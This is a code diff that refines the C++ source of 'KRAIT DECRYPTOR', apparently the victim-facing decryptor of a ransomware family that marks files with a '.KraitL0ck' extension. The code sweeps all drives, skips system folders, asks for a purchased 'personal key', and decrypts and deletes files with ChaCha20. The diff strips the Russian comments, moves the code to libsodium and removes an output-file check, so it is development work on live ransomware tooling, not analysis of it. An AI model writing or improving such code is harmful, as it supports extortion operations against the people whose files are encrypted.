@@ -1,11 +1,11 @@
 #include "encryption.h"
 #include "keygen.h"
+#include <sodium.h>
 #include <windows.h>
 #include <shlobj.h>
 #include <filesystem>
 #include <fstream>
 #include <iostream>
-#include <iomanip>
 #include <vector>
 #include <thread>
 #include <atomic>
@@ -20,12 +20,10 @@ static std::vector<std::thread> decryptThreads;
 static std::atomic<int> filesDecrypted = 0;
 static std::atomic<int> totalFiles = 0;
 
-// Расширения для дешифрации
 std::vector<std::string> GetTargetExtensions() {
     return { ".KraitL0ck" };
 }
 
-// Получить все диски
 std::vector<std::string> GetDrives() {
     std::vector<std::string> drives;
     DWORD mask = GetLogicalDrives();
@@ -41,7 +39,6 @@ std::vector<std::string> GetDrives() {
     return drives;
 }
 
-// Пропуск системных папок
 bool ShouldSkipPath(const std::string& path) {
     static const std::set<std::string> skipDirs = {
         "\\Windows\\", "\\System32\\", "\\SysWOW64\\",
@@ -64,7 +61,6 @@ bool ShouldSkipPath(const std::string& path) {
     return false;
 }
 
-// Подсчет файлов для дешифрации
 void CountFiles(const std::string& dir) {
     if (stopDecrypt) return;
     if (ShouldSkipPath(dir)) return;
@@ -93,50 +89,41 @@ void CountFiles(const std::string& dir) {
     } catch (...) {}
 }
 
-// Дешифрация одного файла
 void DecryptFile(const std::string& filePath, const std::vector<uint8_t>& key) {
     if (stopDecrypt) return;
     
     std::ifstream in(filePath, std::ios::binary);
     if (!in) return;
     
-    // Читаем nonce (12 байт)
-    std::vector<uint8_t> nonce(12);
-    in.read((char*)nonce.data(), 12);
-    if (in.gcount() != 12) {
+    uint8_t nonce[crypto_stream_chacha20_NONCEBYTES];
+    in.read((char*)nonce, sizeof(nonce));
+    if (in.gcount() != sizeof(nonce)) {
         in.close();
         return;
     }
     
-    // Читаем зашифрованные данные
     std::vector<uint8_t> encryptedData((std::istreambuf_iterator<char>(in)), std::istreambuf_iterator<char>());
     in.close();
     
     if (encryptedData.empty()) return;
     
-    // Дешифруем
-    std::vector<uint8_t> decryptedData = Encryption::DecryptData(encryptedData);
-    if (decryptedData.empty()) return;
+    std::vector<uint8_t> decryptedData(encryptedData.size());
+    crypto_stream_chacha20_xor(decryptedData.data(), encryptedData.data(), encryptedData.size(), nonce, key.data());
     
-    // Восстанавливаем оригинальное имя
     std::string originalPath = filePath;
     size_t pos = originalPath.find_last_of('.');
     if (pos != std::string::npos) {
         originalPath = originalPath.substr(0, pos);
     }
     
-    // Записываем расшифрованные данные
     std::ofstream out(originalPath, std::ios::binary);
-    if (!out) return;
     out.write((char*)decryptedData.data(), decryptedData.size());
     out.close();
     
-    // Удаляем зашифрованный файл
     DeleteFileA(filePath.c_str());
     
     filesDecrypted++;
     
-    // Прогресс
     if (totalFiles > 0) {
         int percent = (filesDecrypted * 100) / totalFiles;
         std::cout << "\r[*] Decrypting: " << filesDecrypted << "/" << totalFiles << " (" << percent << "%)" << std::flush;
@@ -145,7 +132,6 @@ void DecryptFile(const std::string& filePath, const std::vector<uint8_t>& key) {
     }
 }
 
-// Дешифрация директории
 void DecryptDirectory(const std::string& dir, const std::vector<uint8_t>& key, int threadIndex) {
     if (stopDecrypt) return;
     if (ShouldSkipPath(dir)) return;
@@ -177,12 +163,9 @@ void DecryptDirectory(const std::string& dir, const std::vector<uint8_t>& key, i
             if (stopDecrypt) break;
             DecryptFile(file, key);
         }
-    } catch (...) {
-        // Молча продолжаем
-    }
+    } catch (...) {}
 }
 
-// Дешифрация диска
 void DecryptDrive(const std::string& drive, const std::vector<uint8_t>& key, int threadIndex) {
     if (stopDecrypt) return;
     if (ShouldSkipPath(drive)) return;
@@ -197,7 +180,6 @@ void DecryptDrive(const std::string& drive, const std::vector<uint8_t>& key, int
     } catch (...) {}
 }
 
-// Подсчет файлов на всех дисках
 void CountAllFiles() {
     auto drives = GetDrives();
     for (const auto& drive : drives) {
@@ -206,21 +188,19 @@ void CountAllFiles() {
     }
 }
 
-// Главная функция дешифрации
 void StartDecryption(const std::string& personalKey) {
     std::cout << "\n========================================\n";
     std::cout << "  KRAIT DECRYPTOR v1.0\n";
     std::cout << "========================================\n";
     std::cout << "[*] Initializing decryption...\n";
     
-    // Генерируем ключ ChaCha20 из персонального ключа
+    sodium_init();
     auto chachaKey = KeyGen::DeriveChaChaKey(personalKey);
     Encryption::Initialize(chachaKey);
     
     std::cout << "[*] Key initialized successfully.\n";
     std::cout << "[*] Scanning for encrypted files...\n";
     
-    // Сначала подсчитываем общее количество файлов
     CountAllFiles();
     std::cout << "[*] Found " << totalFiles << " encrypted files.\n";
     
@@ -255,20 +235,16 @@ int main(int argc, char* argv[]) {
     
     std::string personalKey;
     
-    // Если передан аргумент - используем его
     if (argc >= 2) {
         personalKey = argv[1];
         std::cout << "[*] Using key from command line.\n";
     } else {
-        // Иначе запрашиваем ввод
         std::cout << "\nEnter your personal key: ";
         std::getline(std::cin, personalKey);
     }
     
-    // Удаляем пробелы
     personalKey.erase(std::remove_if(personalKey.begin(), personalKey.end(), ::isspace), personalKey.end());
     
-    // Проверка формата ключа
     if (personalKey.length() < 16 || personalKey.length() > 23) {
         std::cout << "\n[ERROR] Invalid key format!\n";
         std::cout << "Key should be like: XXXX-XXXX-XXXX-XXXX\n";
@@ -276,7 +252,6 @@ int main(int argc, char* argv[]) {
         return 1;
     }
     
-    // Запуск дешифрации
     StartDecryption(personalKey);
     
     std::cout << "\nPress any key to exit...\n";
